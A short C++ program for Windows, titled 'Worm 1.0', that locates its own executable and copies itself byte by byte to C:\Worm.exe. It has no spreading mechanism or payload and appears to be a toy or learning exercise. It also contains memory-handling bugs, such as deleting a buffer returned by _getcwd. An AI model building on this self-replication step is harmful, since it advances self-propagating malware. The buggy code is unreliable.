#include <fstream>
#include <iostream>
#include <direct.h> // _getcwd
#include <stdlib.h> // free, perror
#include <stdio.h>  // printf
#include <string.h> // strlen
#include <filesystem>
namespace fs = std::filesystem;


int main(int argc, char** argv){
    char* bufferCWD;
    char * buffer;
    std::string Path;

    buffer = new char;

    // Get the current working directory:
    if ( (bufferCWD = _getcwd( NULL, 0 )) == NULL ){
        perror( "_getcwd error" );
    } 
    std::cout <<  "Worm 1.0\nbufferCWD = [" << bufferCWD << "]" << std::endl;

    Path = bufferCWD;
    Path += "\\";
    Path += argv[0];
    
    std::cout <<  "Path = [" << Path << "]" << std::endl;

    std::ifstream infile(Path, std::ios::binary);
    std::ofstream outfile("C:\\Worm.exe", std::ios::binary);
    

    infile.read(buffer, sizeof(char));
    while (!infile.eof()){
        outfile.write(buffer, sizeof(char));
        infile.read(buffer, sizeof(char));
    }
    

    delete bufferCWD;
    delete buffer;
    return 0;
}